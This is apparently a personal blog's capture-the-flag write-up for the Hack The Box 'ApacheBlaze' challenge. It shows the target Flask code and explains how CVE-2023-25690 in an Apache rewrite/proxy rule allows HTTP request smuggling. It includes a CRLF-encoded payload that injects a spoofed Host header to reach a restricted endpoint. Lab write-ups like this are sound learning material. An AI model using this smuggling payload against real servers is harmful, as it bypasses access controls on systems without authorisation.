---
author: M4arcu$
image: /images/apache_blaze_thumb_300.png
layout: post
title: HTB-ApacheBlazing
---

# APACHE

hakjsdja kasd kjahsd kajhd

![image](/images/apache_blaze.png)


```python
@app.route('/', methods=['GET'])
def index():
    game = request.args.get('game')

    if not game:
        return jsonify({
            'error': 'Empty game name is not supported!.'
        }), 400

    elif game not in app.config['GAMES']:
        return jsonify({
            'error': 'Invalid game name!'
        }), 400

    elif game == 'click_topia':
        return jsonify({key: value for key, value in request.headers

        }), 200
        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
            return jsonify({
                'message': f'{app.config["FLAG"]}'
            }), 200
        else:
            return jsonify({
                'message': 'This game is currently available only from dev.apacheblaze.local.'
            }), 200

    else:
        return jsonify({
            'message': 'This game is currently unavailable due to internal maintenance.'
        }), 200
```

<!--excerpt.start-->
we need to get `X-Forwarded-Host` to be only `dev.apacheblaze.local`
between client and backend is a apache proxy server.

regognized the requests are having the form of api endpoints but ended up as url parameters.
<!--excerpt.end-->

![image](/images/Pasted image 20231002230311.png)


there must be some kind of parsing rule in the proxy server.

googling showed a CVE that was interesting and leaded to the solution:

**CVE-2023-25690** and this [POC - Link](https://github.com/dhmosfunk/CVE-2023-25690-POC)

turns out the rewrite rule could be used to send a request before the intended one.

the rule looks something like this:
```
RewriteRule "^/categories/(.*)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
```

so everything after *games* will be passed as argument.
we can exploit that with a long string, where whitespace is url encoded:

```
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1
```

there are two requests. but only the first one gets processed and here we set *host* to the *dev.apacheblaze.local* string to get the flag.

![image](/images/Pasted image 20231002231038.png)
